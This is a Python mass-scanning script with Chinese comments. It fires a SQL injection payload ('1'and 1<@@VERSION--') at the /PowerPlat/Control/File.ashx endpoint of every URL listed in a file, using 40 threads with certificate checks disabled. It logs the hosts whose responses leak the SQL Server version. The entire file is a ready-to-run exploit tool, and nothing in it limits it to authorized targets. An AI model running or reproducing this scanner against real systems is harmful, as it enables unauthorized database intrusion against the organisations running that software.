import requests
import threading
from urllib.parse import urljoin
from concurrent.futures import ThreadPoolExecutor, as_completed
import time
import urllib3
import re

# 禁用SSL警告
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# 线程数
THREADS = 40

# POC数据
POC_DATA = "NoCheckSession=true&ServerOperatorType=OpenRecord&_fileid=1'and 1<@@VERSION--&_type=ftp&action=topdf&sessionid=1"
POC_HEADERS = {
    "Content-Type": "application/x-www-form-urlencoded"
}
POC_PATH = "/PowerPlat/Control/File.ashx"

# 数据库版本关键词 - 针对SQL Server
DB_VERSION_KEYWORDS = [
    "Microsoft SQL Server"
]

def create_http_session():
    """创建具有更好SSL兼容性的HTTP会话"""
    session = requests.Session()
    
    # 配置更宽松的SSL设置
    session.verify = False
    
    # 添加重试机制
    from requests.adapters import HTTPAdapter
    from requests.packages.urllib3.util.retry import Retry
    
    retry_strategy = Retry(
        total=2,
        status_forcelist=[429, 500, 502, 503, 504],
        allowed_methods=["POST"],
        backoff_factor=1
    )
    
    adapter = HTTPAdapter(max_retries=retry_strategy, pool_connections=100, pool_maxsize=100)
    session.mount("http://", adapter)
    session.mount("https://", adapter)
    
    return session

def normalize_url(url):
    """规范化URL：添加协议前缀，去除末尾斜杠"""
    url = url.strip()
    
    # 如果没有http或https前缀，添加http://
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url
    
    # 去除末尾的/
    if url.endswith('/'):
        url = url[:-1]
    
    return url

def extract_db_info(response_text):
    """从响应中提取数据库版本信息"""
    # 转换为小写以便不区分大小写匹配
    text_lower = response_text.lower()
    
    # 查找SQL Server版本信息
    version_patterns = [
        r'sql server.*\d{4}',
        r'microsoft sql server.*\d{4}',
        r'mssql.*\d{4}',
        r'version.*\d{2,4}\.\d{2,4}',
        r'\d{4}.*sql server',
        r'edition.*\d{4}'
    ]
    
    found_versions = []
    for pattern in version_patterns:
        matches = re.findall(pattern, text_lower, re.IGNORECASE)
        found_versions.extend(matches)
    
    # 检查关键词
    found_keywords = []
    for keyword in DB_VERSION_KEYWORDS:
        if keyword.lower() in text_lower:
            found_keywords.append(keyword)
    
    return found_versions, found_keywords

def check_vulnerability(url):
    """检测单个URL的漏洞"""
    session = create_http_session()
    
    try:
        # 构建完整的请求URL
        target_url = urljoin(url, POC_PATH)
        
        # 发送POST请求，使用更宽松的SSL配置
        response = session.post(
            target_url,
            data=POC_DATA,
            headers=POC_HEADERS,
            timeout=15,  # 增加超时时间
            verify=False,
            allow_redirects=True  # 允许重定向
        )
        
        # 检查响应
        if response.status_code == 200:
            response_text = response.text
            
            # 提取数据库版本信息
            found_versions, found_keywords = extract_db_info(response_text)
            
            # 检查是否包含数据库版本信息
            if found_versions or found_keywords:
                # 存在漏洞，写入详细结果
                result = f"""
========== SQL注入漏洞发现 ==========
目标URL: {target_url}
状态码: {response.status_code}
发现的版本信息: {found_versions}
发现的关键词: {found_keywords}
响应内容预览: {response_text[:500]}...
====================================

"""
                with threading.Lock():
                    with open("result.txt", "a", encoding="utf-8") as f:
                        f.write(result)
                print(f"[+] SQL注入漏洞发现: {url}")
                print(f"    版本信息: {found_versions}")
                print(f"    关键词: {found_keywords}")
                return True
            else:
                print(f"[-] 无漏洞 (无数据库版本信息): {url}")
                return False
        else:
            print(f"[-] 无漏洞 (状态码{response.status_code}): {url}")
            return False
            
    except requests.exceptions.SSLError as e:
        # SSL错误特殊处理
        print(f"[!] SSL错误: {url} - 错误: {str(e)}")
        
        # 尝试使用HTTP替代HTTPS
        if url.startswith('https://'):
            http_url = url.replace('https://', 'http://', 1)
            print(f"[!] 尝试使用HTTP替代: {http_url}")
            try:
                return check_vulnerability(http_url)  # 递归调用
            except:
                return False
        return False
        
    except requests.exceptions.RequestException as e:
        print(f"[!] 请求失败: {url} - 错误: {str(e)}")
        return False
    except Exception as e:
        print(f"[!] 检测异常: {url} - 错误: {str(e)}")
        return False
    finally:
        session.close()

def main():
    """主函数"""
    print("开始SQL注入漏洞检测...")
    print(f"线程数: {THREADS}")
    print("检测目标: 数据库版本信息泄露")
    print("=" * 50)
    
    try:
        # 读取URL文件
        with open("url.txt", "r", encoding="utf-8") as f:
            urls = f.readlines()
        
        if not urls:
            print("url.txt文件中没有找到URL")
            return
        
        # 规范化URL
        normalized_urls = []
        for url in urls:
            if url.strip():  # 跳过空行
                normalized_url = normalize_url(url)
                normalized_urls.append(normalized_url)
        
        print(f"共读取到 {len(normalized_urls)} 个URL")
        
        # 清空或创建结果文件
        open("result.txt", "w").close()
        
        # 写入检测信息头
        with open("result.txt", "a", encoding="utf-8") as f:
            f.write(f"SQL注入漏洞检测报告\n")
            f.write(f"检测时间: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"检测目标总数: {len(normalized_urls)}\n")
            f.write("=" * 50 + "\n\n")
        
        # 使用线程池进行并发检测
        with ThreadPoolExecutor(max_workers=THREADS) as executor:
            # 提交所有任务
            future_to_url = {
                executor.submit(check_vulnerability, url): url 
                for url in normalized_urls
            }
            
            # 等待所有任务完成
            completed = 0
            for future in as_completed(future_to_url):
                url = future_to_url[future]
                try:
                    future.result()
                except Exception as e:
                    print(f"[!] 任务异常: {url} - {str(e)}")
                
                completed += 1
                if completed % 10 == 0:  # 每10个URL输出一次进度
                    print(f"进度: {completed}/{len(normalized_urls)}")
        
        print("=" * 50)
        print("漏洞检测完成！")
        print("详细结果已保存到 result.txt")
        
        # 统计结果
        try:
            with open("result.txt", "r", encoding="utf-8") as f:
                content = f.read()
                vuln_count = content.count("========== SQL注入漏洞发现 ==========")
                print(f"发现漏洞数量: {vuln_count}")
        except:
            pass
        
    except FileNotFoundError:
        print("错误: 未找到 url.txt 文件")
    except Exception as e:
        print(f"程序执行异常: {str(e)}")

if __name__ == "__main__":
    main()